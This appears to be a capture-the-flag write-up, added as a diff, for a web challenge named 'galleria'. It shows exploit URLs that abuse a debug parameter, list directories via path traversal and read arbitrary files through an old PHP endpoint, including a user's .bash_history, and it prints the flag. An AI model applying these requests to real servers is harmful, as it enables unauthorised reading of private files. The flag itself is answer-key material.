@@ -1,0 +1,39 @@
+web challenge galleria-
+
+step 1. when looking at the developer console we can find a strange code snippet which indicates that there might be a directory traversal exploit..
+we check it out: http://host/get_files_items.php?debug=FALSE&folder=images
+we are getting a message:
+-----------------------------------------------------------------------------
+DEBUG Message: Getting a list op all the files in folder: images from the param folder using PHP function 'glob'.
+
+Code Debug:
+$folder = $_REQUEST["folder"];
+$pictues = glob($folder . "/*");
+-----------------------------------------------------------------------------
+hmm interesting, maybe we can use it to get to different folders?
+yep. when using folder=../ parameter we get to a folder which contains clue_folder_good_job
+inside it we find the clue:
+
+Well Done!
+The developer wrote the secret key somewhere on machine...
+Clue: The file you are using to exploit has an older version somewhere, good luck.
+
+with a little bit more searching we find php_folder_cant_find_me_by_brute_force directory.
+inside it we find the older version file.
+old_get_files_items.php
+remembering from the newer file there was a ?debug=True parameter.
+trying it on this file works aswell and we get the debug message:
+Code Debug:
+$file = $_REQUEST["file"];
+print file_get_contents($file);
+
+after that, we can finally read some files.
+going into the /home/developer_user directory we find a clue message and the flag, 
+the clue message reads:
+
+Good job! you are almost done, but you can't read the flag...
+
+hmm, maybe trying to get root is overkill, lets try to get the commands log.
+php_folder_cant_find_me_by_brute_force/old_get_files_items.php?debug=True&file=/home/developer_user/.bash_history
+and thats it! we found the flag!
+echo S1FLAG.xDI0UiExW4pALibNe8aq4BDvHuk > SECRET_KEY
